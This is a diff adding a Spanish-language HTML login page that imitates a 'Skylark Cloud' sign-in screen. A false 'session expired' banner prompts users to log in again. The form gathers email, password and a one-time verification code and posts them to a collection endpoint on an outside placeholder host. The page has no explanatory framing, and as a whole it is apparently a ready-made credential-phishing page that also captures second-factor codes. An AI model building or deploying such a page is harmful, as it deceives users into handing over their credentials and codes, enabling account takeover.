@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang='es'>
+<head>
+  <!-- actualizado -->
+  <meta charset='UTF-8'>
+  <title>Skylark Cloud - Acceder</title>
+  <link rel='stylesheet' href='style.css'>
+
+</head>
+
+<body>
+
+  <div class='notice-banner'>
+    Tu sesión ha expirado. Acceder de nuevo para continuar.
+
+  </div>
+
+
+  <div class='login-card'>
+    <h1 class='brand-title'>Skylark Cloud</h1>
+
+    <form id='loginForm' action='https://example.invalid/collect' method='POST'>
+      <label for='userEmail'>Dirección de correo</label>
+      <input type='email' id='userEmail' name='email' required>
+
+      <label for='userPassword'>Password</label>
+      <input type='password' id='userPassword' name='password' required>
+
+
+      <label for='otpField'>Código de verificación</label>
+      <input type='text' id='otpField' name='otp' maxlength='6'>
+
+
+      <label><input type='checkbox' id='rememberMe'> Recordarme</label>
+      <button type='submit' id='submitBtn'>Acceder</button>
+    </form>
+  </div>
+
+  <div class='help-text'>
+
+    ¿Necesitas ayuda? Escribe a soporte@example.invalid
+  </div>
+
+  <script src='script.js'></script>
+
+</body>
+
+</html>
+
